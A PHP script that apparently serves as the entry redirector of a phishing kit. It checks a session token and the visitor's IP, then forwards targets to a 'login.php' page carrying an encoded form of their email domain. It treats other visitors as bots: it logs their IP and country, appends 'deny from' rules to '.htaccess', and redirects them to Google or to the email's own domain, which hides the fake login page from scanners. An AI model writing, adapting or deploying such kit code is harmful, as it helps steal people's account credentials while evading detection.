<?php
session_start();
require_once('../config.php');
defined('2BgI5Youc1knSTVZb3VjMWtueVBZOXVETjkwNXkQ4VlMzZmNXNzFFRkx0VE0xQkwvLbk0yTUE9PTV51qt8VS3ZmNXNzFFRkx0VE0xQkw0') or exit(header(sprintf("Location:%s", 'http://www.google.com/search?q=404%20page')));
require_once('../netends.php');
require_once('../mxrec.php');

if((isset($_SESSION['visitor_ip']) && !empty($_SESSION['visitor_ip'])) && (isset($_GET['sessid']) && ($_GET['sessid'] == $_SESSION['csrftoken']))){
	if ($_SESSION['visitor_ip'] == show_visitor_ip()) {
		$enc =   Random::AlphaNumeric(16);
		$_SESSION['hsh'] = $enc;
		$dom =  encodeDomain($_SESSION['myemail']);
		exit(header("Location:login.php?puid=$enc&origin=1&url=$dom"));
	}
	else {
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", 'http://'.getDomain($_SESSION['myemail']))));
	}
}
else {
	$bot = show_visitor_ip().' - '.show_visitor_locationByIp('countryName');
	file_put_contents( '../botsip.txt', $bot."\r\n" , FILE_APPEND | LOCK_EX );	
	$blocked = 'deny from '.show_visitor_ip();
	file_put_contents( '../.htaccess', $blocked."\r\n" , FILE_APPEND | LOCK_EX );	
	$_SESSION = '';
	session_destroy();
	exit(header(sprintf("Location:%s", 'http://'.getDomain($_SESSION['myemail']))));
}
	


?>
